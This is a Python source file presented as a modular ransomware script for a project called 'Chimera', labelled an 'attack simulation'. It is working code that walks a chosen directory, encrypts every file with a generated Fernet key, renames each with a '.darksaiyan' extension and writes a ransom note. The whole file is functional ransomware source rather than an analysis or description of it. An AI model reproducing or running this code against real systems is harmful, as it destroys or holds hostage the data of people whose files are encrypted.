# ransomware.py
# Modular version of the ransomware script for Chimera.

import os
from cryptography.fernet import Fernet

def generate_key(key_file_path):
    """
    Generates a new encryption key and saves it to the specified file.
    :param key_file_path: Where to save the encryption key.
    :return: The generated encryption key.
    """
    print("[*] Generating a new encryption key...")
    key = Fernet.generate_key()
    with open(key_file_path, "wb") as key_file:
        key_file.write(key)
    print(f"[+] Key saved to {key_file_path}")
    return key

def find_files(directory, key_file_name):
    """
    Recursively finds all files in a directory, excluding the key file itself.
    :param directory: Directory to search in.
    :param key_file_name: Exclude this file from encryption.
    :return: A list of file paths.
    """
    files_to_target = []
    print(f"[*] Searching for files in {directory}...")
    for root, _, files in os.walk(directory):
        for filename in files:
            file_path = os.path.join(root, filename)
            if os.path.basename(file_path) == key_file_name:
                continue
            files_to_target.append(file_path)
    print(f"[+] Found {len(files_to_target)} files to target.")
    return files_to_target

def encrypt_files(files, key, new_extension):
    """
    Encrypts the provided files and renames them with the new extension.
    :param files: List of file paths to encrypt.
    :param key: The encryption key (Fernet-compatible).
    :param new_extension: The extension to add to encrypted files.
    """
    print("[*] Encrypting files...")
    cipher = Fernet(key)
    for file_path in files:
        try:
            with open(file_path, 'rb') as file:
                original_content = file.read()
            encrypted_content = cipher.encrypt(original_content)
            with open(file_path, 'wb') as file:
                file.write(encrypted_content)
            file_root, _ = os.path.splitext(file_path)
            new_file_path = file_root + new_extension
            os.rename(file_path, new_file_path)
            print(f"    [+] Encrypted: {file_path} -> {new_file_path}")
        except Exception as e:
            print(f"    [!] Error processing {file_path}: {e}")
    print("[*] Encryption complete.")

def drop_ransom_note(note_path, note_content):
    """
    Drops the ransom note in the specified path.
    :param note_path: Where to drop the note.
    :param note_content: Content of the ransom note.
    """
    print("[*] Dropping ransom note...")
    try:
        with open(note_path, "w") as note_file:
            note_file.write(note_content)
        print(f"[+] Note dropped at {note_path}")
    except Exception as e:
        print(f"[!] Failed to drop ransom note: {e}")

def ransomware_attack(target_directory, ransom_note, new_extension=".darksaiyan", key_file="KEY.txt"):
    """
    Executes a full ransomware attack simulation (modularized).
    :param target_directory: Directory to encrypt files in.
    :param ransom_note: Dictionary containing the ransom note's content and filename.
    :param new_extension: Extension for encrypted files.
    :param key_file: Name of the file where encryption key will be stored.
    """
    key = generate_key(os.path.join(target_directory, key_file))
    files = find_files(target_directory, key_file)
    encrypt_files(files, key, new_extension)
    ransom_note_path = os.path.join(target_directory, ransom_note["filename"] + ".txt")
    drop_ransom_note(ransom_note_path, ransom_note["content"])
    print("[*] Ransomware attack simulation complete.")
